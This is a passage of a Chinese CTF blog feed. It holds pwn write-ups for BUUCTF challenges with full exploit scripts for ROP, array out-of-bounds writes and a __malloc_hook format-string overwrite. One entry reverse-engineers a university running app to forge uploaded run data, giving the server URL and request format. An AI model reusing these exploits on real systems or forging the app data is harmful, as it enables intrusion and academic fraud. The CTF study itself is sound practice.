title="Help marvin"></a>Help marvin</h2><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/46.png"></p><h3 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h3><ul><li>给了.mr文件，可以用PluseView打开查看波形</li><li>提示SPI，用SPI decode<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/47.png"></li><li>这个软件把前面高阻态的0一起解码了，我不知道怎么调就把译出来数据拿出来自己解了</li><li>脚本如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pyhton3">a=[0x34,0x33,0xB0,0xB6,0xB2,0xBD,0x9A,0x2F,0x9A,0xBA,0x1A,0x37,0x33,0xB2,0xAF,0xA9,0xB8,0x18,0xBE]<br>b=&quot;&quot;<br>for x in a:<br>    if len(bin(x)[2:])!=8:<br>        for i in range(8-len(bin(x)[2:])):<br>            b+=&quot;0&quot;<br>        b+=bin(x)[2:]<br>    else:<br>        b+=bin(x)[2:]<br>print(b)<br>b=b[1:]<br>b+=&quot;1&quot;<br>tmp=&quot;&quot;<br>for x in range(0,len(b),8):<br>    for i in range(8):<br>        tmp+=b[x+i]<br>    print(chr(int(tmp,2)),end=&quot;&quot;)<br>    tmp=&quot;&quot;<br></code></pre></td></tr></table></figure></li></ul><h2 id="Help-the-uncle-who-can’t-jump-twice"><a href="#Help-the-uncle-who-can’t-jump-twice" class="headerlink" title="Help the uncle who can’t jump twice"></a>Help the uncle who can’t jump twice</h2><ul><li>不会</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>HGAME</category>
      
      <category>Wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>HGAME</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>inndy_stack</title>
    <link href="/2022/12/10/inndy-stack/"/>
    <url>/2022/12/10/inndy-stack/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/12/10/inndy-stack/1.png"></p><ul><li>32位,保护全开</li></ul><p><img src="/2022/12/10/inndy-stack/2.png"></p><ul><li>实现了一个简单的栈</li></ul><p><img src="/2022/12/10/inndy-stack/3.png"></p><ul><li>pop</li></ul><p><img src="/2022/12/10/inndy-stack/4.png"></p><ul><li>push</li></ul><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr</li><li>可以通过pop泄露程序地址、栈地址和libc地址</li><li>泄露libc地址后ROP</li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-08 14:20:13</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt=<span class="hljs-string">&quot;Cmd &gt;&gt;\n&quot;</span></span>):<br>    sla(prompt, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>():<br>    cmd(<span class="hljs-string">&#x27;p&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">d</span>):<br>    cmd(<span class="hljs-string">&#x27;i&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(d))<br><br>pop()<br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br><br>libc=ELF(<span class="hljs-string">&quot;../libc/libc-2.23_32.so&quot;</span>)<br><span class="hljs-comment"># libc_base-=0x1D5B73</span><br><br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>elf_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>elf_base-=<span class="hljs-number">0x75a</span><br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>stack=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    push(<span class="hljs-number">0x59</span>)<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>libc_base-=<span class="hljs-number">0x18637</span><br>one=libc_base+<span class="hljs-number">0x3a80c</span><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(system)<br>push(stack+<span class="hljs-number">0x78</span>)<br>push(libc_base+<span class="hljs-number">0x0015902b</span>)<br>cmd(<span class="hljs-string">&quot;x&quot;</span>)<br><span class="hljs-built_in">print</span>(libc_base)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf_base))<br>ia()<br><br></code></pre></td></tr></table></figure><p><img src="/2022/12/10/inndy-stack/5.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>BUU</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>BUU</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arr_sun_2016</title>
    <link href="/2022/12/10/arr-sun-2016/"/>
    <url>/2022/12/10/arr-sun-2016/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/12/10/arr-sun-2016/1.png"></p><ul><li>没开PIE和RELRO</li></ul><p><img src="/2022/12/10/arr-sun-2016/2.png"></p><ul><li>有system函数</li></ul><p><img src="/2022/12/10/arr-sun-2016/3.png"></p><ul><li>v1为int，输入负数绕过对v1的检测，v5[v1]时将v1当成unsigned int用，因此可以修改v5后任意地址的值</li></ul><p><img src="/2022/12/10/arr-sun-2016/4.png"></p><ul><li>返回地址下面有一个栈地址，可以当作sh的指针</li></ul><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>修改返回地址为ret，再call system，目的是越过返回地址和栈地址中间的那个栈帧</li><li>修改栈地址为sh，距离返回地址的偏移为0x24</li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-03 19:43:34</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br>rl()<br>sl(<span class="hljs-string">&quot;asd&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(i))<br>    rl()<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">500</span>))<br><br>rl()<br>sl(<span class="hljs-string">&quot;-2147483635&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;134514065&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;-2147483634&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;134514055&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;-2147483626&quot;</span>)<br>rl()<br>sl(<span class="hljs-string">&quot;26739&quot;</span>)<br>ia()<br></code></pre></td></tr></table></figure><p><img src="/2022/12/10/arr-sun-2016/5.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>BUU</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>BUU</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浙理体育逆向分析</title>
    <link href="/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>看了qfrost师傅的文章<a href="http://www.qfrost.com/undefined/%E7%BA%A2%E8%9C%BB%E8%9C%93/">“红蜻蜓”跑步APP逆向分析与数据伪造思路</a>后，自己写了一个刷120km的脚本，新版本的浙理体育有些小改动，但大致不变，抓下上传时发送的包，修改下跑步时间就能构造伪造数据送给服务器，建议先看qfrost师傅的文章</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>fiddler抓上传时的包，gzip解密就可以看到上传数据的格式</p><div class="note note-danger">            <p>{<br>‘begintime’:’’,<br>‘endtime’:’’,<br>‘uid’:’’,<br>‘schoolno’:’’,<br>‘distance’:’’,<br>‘speed’:’’,<br>‘studentno’:’’,<br>‘atttype’:’’,<br>‘eventno’:’’,<br>‘location’:’’,<br>‘pointstatus’:’’,<br>‘usetime’:’’<br>}</p>          </div><h1 id="获取uid"><a href="#获取uid" class="headerlink" title="获取uid"></a>获取uid</h1><ul><li><p>insertUUID 方法里更新uid<br><img src="/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.png"></p></li><li><p>updateBindSchool 方法会调用insertUUID，它发送post请求向服务器请求uid<br><img src="/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.png"></p></li><li><p>服务器地址为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BIND_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://quantiwang.cn:8012/cloud/DflyServer&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>发送格式为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">name</span>=[<span class="hljs-string">&#x27;bangdingschool&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br></code></pre></td></tr></table></figure><p>第二项是学校id，第三项是学号，后面的都是设备信息</p></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Utility</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0ctf_2017_EasiestPrintf</title>
    <link href="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/"/>
    <url>/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p><img src="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/1.png"></p><ul><li>没开PIE</li></ul><p><img src="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/2.png"></p><ul><li>可以leak任意地址指向的数据</li></ul><p><img src="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/3.png"></p><ul><li>存在格式化字符串漏洞</li></ul><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><ul><li>首先leak got表指向的libc函数地址</li><li>利用格式字符串漏洞修改__malloc_hook位one_gadget</li><li>通过printf打印超过65536个字符来调用malloc</li></ul><h1 id="0x03-Exp"><a href="#0x03-Exp" class="headerlink" title="0x03 Exp"></a>0x03 Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-07 16:57:38</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>libc=ELF(<span class="hljs-string">&quot;../libc/libc-2.23_32.so&quot;</span>)<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>exit_got=elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>rl()<br>sl(<span class="hljs-built_in">str</span>(read_got))<br>read_addr=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>base=read_addr-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mh=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one=base+<span class="hljs-number">0x3a812</span><br>ru(<span class="hljs-string">&quot;Good Bye&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(one))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(mh))<br>p=fmtstr_payload(<span class="hljs-number">7</span>,&#123;mh:one&#125;)+<span class="hljs-string">b&quot;%65599c&quot;</span><br>sl(p)<br>stop()<br>ia()<br></code></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ul><li>printf打印超过65536个字符时，内部会调用malloc</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>BUU</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>BUU</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
